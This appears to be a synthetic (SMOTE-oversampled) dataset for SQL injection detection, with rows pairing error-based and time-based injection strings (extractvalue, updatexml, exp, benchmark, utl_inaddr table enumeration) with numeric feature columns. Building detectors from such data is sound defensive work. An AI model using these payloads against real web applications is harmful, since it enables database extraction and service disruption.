id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000084,attack,error,"1%"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,nearest_attack_euclidean,R000247,0.8435473607516225,186.98553688394858,29.19710737678972,3.5818360060136465,48.37975163752803,32.0,79.0,27.605785246420563,0.2586081622201945,0.17115528963895865,0.42253962129617917,0.14769692684466768,0.0,4.000000000000001,0.0,0.0,1.0,2.0,0.0,14.0,1.6057852464205624,0.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.8028926232102815,0.1971073767897187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000085,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R000127,1.778389171612236,182.09848054433635,28.728354363476623,3.5636283481341566,49.33729933274762,32.0,76.45670872695325,24.304472484635497,0.27009874416879065,0.1763119378682241,0.4203095597119032,0.13327975825108207,0.0,2.7283543634766243,0.0,0.0,1.0,1.5761181211588746,0.0,14.0,0.0,0.0,4.0,2.5761181211588746,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.5761181211588746,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.576118121158874
SMOTE_000086,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000097,0.5898261566809446,149.26929148936043,32.26929148936043,3.7926335101349875,50.0,23.0,58.0,18.269291489360427,0.334968027988008,0.1540852928744837,0.38856291246608926,0.12238376667141905,0.2692914893604246,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,4.0,0.0,0.26929148936042463,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000087,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,0.8145484680476557,171.3243899283726,29.297559713490397,3.7773791226281985,49.297559713490394,35.0,64.3512201432548,22.6756100716274,0.28771630608068044,0.20429234164650342,0.37562808714648277,0.1323632651263333,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.675610071627401,0.0,12.0,0.0,0.0,5.0,1.675610071627401,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000088,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000205,1.530804746661436,168.8467784988706,28.211694624717655,3.4872935476160305,43.82728745767453,31.40389820823922,72.21169462471765,21.40389820823922,0.2591795047327095,0.18611381557255552,0.4278892961832692,0.1268173835114658,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.40389820823921796,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.403898208239218,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.403898208239218
SMOTE_000089,attack,error,"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000169,0.479288531384291,160.20364215794737,30.0,3.8558989751701036,38.0,47.0,55.0,20.20364215794736,0.23719959619557454,0.29337844792610535,0.34331520501991053,0.12610675085840956,0.0,0.20364215794736062,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.0,0.20364215794736057,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000090,attack,error,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000068,0.5064213930462995,173.22704984069674,36.0,3.96986328488358,58.797099926475425,31.0,63.797099926475425,19.632849987745903,0.33925889501634743,0.1791951465760436,0.3681613380124835,0.11338462039512551,0.0,1.0,0.0,0.0,0.0,1.0,0.0,12.632849987745903,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000091,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R000067,1.8019766877498435,191.5985777305268,30.0,3.8865399034517036,68.3990518203512,37.0,66.5997629550878,19.5997629550878,0.35691806350107635,0.19315783680550855,0.3476433786285846,0.10228072106483047,0.0,0.4002370449121996,1.199525910175601,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,2.199525910175601,0.0,0.4002370449121996,0.5997629550878005,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,4.0
SMOTE_000092,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000236,0.45064254096802386,180.18309659381825,32.366193187636505,3.834833186077307,44.0,47.0,67.0,22.183096593818252,0.2441971685043584,0.2608469754478374,0.37184568840436394,0.12311016764344025,0.0,0.18309659381825105,2.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,0.0,0.18309659381825105,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000093,attack,error,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000139,0.46333106202902435,164.63104527726333,31.0,3.8595571146491654,39.0,47.0,57.10483622181066,21.526209055452664,0.23694792763313116,0.2855526307373632,0.3467611435530363,0.13073829807646936,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.526209055452664,0.0,0.0,6.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000094,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",nearest_attack_euclidean,R000238,0.8686810108241186,180.92553604321722,30.0,3.5620426110698844,47.246276802160864,33.97021441728689,76.21649121944776,23.492553604321724,0.26159104021188256,0.1873011532948615,0.42119703117534585,0.1299107753179101,0.0,1.1102230246251565e-16,2.0,0.0,1.0,1.2462768021608617,0.0,14.246276802160862,0.0,0.0,4.0,4.246276802160862,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.2462768021608616,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.246276802160862
SMOTE_000095,attack,error,"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000151,0.45660634536127986,163.52343971746447,29.62851595761967,3.8085549461257258,38.87617198587322,46.00937588698579,57.88554787285901,20.752343971746445,0.2380768443915597,0.28115013742031736,0.3538173792525248,0.12695563893559814,0.0,1.1102230246251565e-16,2.0,0.0,0.0,1.8761719858732229,0.0,10.876171985873224,0.0,0.0,6.0,3.8761719858732233,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8761719858732232,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8761719858732233
SMOTE_000096,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000123,0.10968992289004505,183.1519853395056,31.848014660494414,3.852183366472886,50.77202199074162,43.30397067901117,66.0,23.075992669752793,0.27722725659403136,0.2364227223352623,0.360359443733352,0.1259905773373544,2.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.075992669752793,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000097,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000099,0.4741850894962647,186.52940525741155,27.747059474258844,3.543178104315367,47.0,35.0,79.02352420592923,25.50588105148231,0.2521043801238698,0.18773730434756264,0.42345260670860296,0.1367057088199646,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.50588105148231,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000098,attack,error,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000005,0.7883510751469133,177.90969898043147,32.32441472267222,3.8059483914778194,47.0,43.0,66.35117055465555,21.558528425775926,0.26428031205689084,0.24178837060524058,0.3727628323091028,0.12116848502876579,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.558528425775926,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000099,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000220,1.0900530555029284,141.66337820238493,26.443896367064156,3.654380504131193,37.0,35.0,52.77558546825663,16.887792734128315,0.26129769320326257,0.24717349357065377,0.3724125076539836,0.11911630557210005,0.4438963670641569,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.443896367064157,0.0,0.0,5.0,1.0,0.4438963670641568,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,error,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000068,0.5243934739061472,173.05766551495364,36.0,3.969635279000363,58.71892254536322,31.0,63.71892254536322,19.619820424227203,0.3391368953579326,0.17937393153001147,0.3680681746369667,0.11342099847508919,0.0,1.0,0.0,0.0,0.0,1.0,0.0,12.619820424227203,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.6741129688768238,171.1194408718489,30.514930108981112,3.839374028687186,43.544790326943335,45.05972043592445,61.0,21.514930108981112,0.25440422473847335,0.26319375039554765,0.3566711413795455,0.1257308834864335,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.514930108981113,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000102,attack,error,"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000168,0.629848264865843,196.26474105241152,30.26474105241152,3.563429251910128,48.0,40.0,83.0,25.26474105241152,0.24456884982607083,0.20380737485505904,0.4229003028242475,0.12872347249462265,0.0,0.26474105241151946,2.0,0.0,1.0,2.0,0.0,15.0,0.0,0.0,4.0,5.0,0.0,0.26474105241151935,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000103,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000002,1.1483291889403806,146.98789938003964,38.28744294570863,4.123045020040903,73.27534232574826,1.0,53.0,19.712557054291374,0.49834263886158986,0.00680650820587772,0.3607449349115181,0.13410591802101438,3.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,8.0,0.0,4.425114108582749,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000104,attack,error,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000197,0.13798540445332416,176.73526180643398,35.90271244664876,3.9677955740586555,60.4162746798926,31.0,65.4162746798926,19.902712446648767,0.3417856970659997,0.17549223302691683,0.3700908959413089,0.11263117396577463,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.902712446648767,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,error,"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",nearest_attack_euclidean,R000259,0.9353947528137706,180.37194822214366,27.0,3.5311607691363944,36.37194822214366,47.0,75.0,22.0,0.2016439700426239,0.2605745375555325,0.41581043226946673,0.1219710601323769,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,6.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.3719482221436596,0.6280517778563406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000106,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",nearest_attack_euclidean,R000136,1.915226661443501,199.51068286300236,30.489317136997634,3.536414214334176,62.04273145200946,24.0,86.97863427399527,26.489317136997634,0.3109513212856719,0.12029506561024983,0.4359750786075591,0.13277853449651925,4.0,1.1102230246251565e-16,0.0,0.0,0.0,0.4893171369976347,0.0,18.0,0.0,0.0,4.0,0.4893171369976348,1.0,0.0,0.0,0.0,0.0,0.4893171369976348,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000076,0.5363530635502634,140.60092219066973,27.600922190669746,3.5682901234991142,56.0,12.399077809330254,58.60092219066975,13.600922190669746,0.3983034010573241,0.08822179217447468,0.4167700198803469,0.09670478688785436,0.8004610953348725,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,0.8004610953348723,2.0,0.8004610953348725,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,7.0
SMOTE_000108,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000143,0.47074616294806304,186.7921800566014,27.22078199433986,3.4578127631749283,37.66234598301958,38.116872022640564,81.67530803396085,29.337654016980423,0.201882082371093,0.20396068073871926,0.4371695271709581,0.15698770971922962,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,15.558436011320282,1.9999999999999998,0.0,5.779218005660141,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000109,attack,error,"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000184,1.5193427847689036,168.65458355067355,33.53091671013471,3.870904057031711,54.0,32.0,62.123666840538846,20.53091671013471,0.32025126781736163,0.18977852907695505,0.36825384634992725,0.12171635675575604,0.5309167101347114,0.4690832898652885,2.0,0.0,0.0,1.0,0.0,12.530916710134711,0.0,0.0,4.0,3.0,0.5309167101347114,0.4690832898652886,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000091,0.3231185584623363,185.85538744563547,29.85538744563548,3.6824506648674262,48.85538744563548,38.42154978254191,73.57845021745808,25.0,0.2628650996818384,0.2067145640561759,0.3959066683207153,0.13451366794127034,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.1446125543645222,0.0,14.0,0.0,0.0,5.855387445635477,1.1446125543645222,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000111,attack,error,"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000285,0.06090068095706724,196.856032085873,31.0,3.5976694337011548,48.0,40.0,82.90402139058202,25.952010695291005,0.24383847928025343,0.20319873273354452,0.4211348646136337,0.13182792337256835,0.0,0.976005347645502,2.0,0.0,1.0,2.0,0.0,14.976005347645502,0.0,0.0,4.0,5.0,0.0,0.976005347645502,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
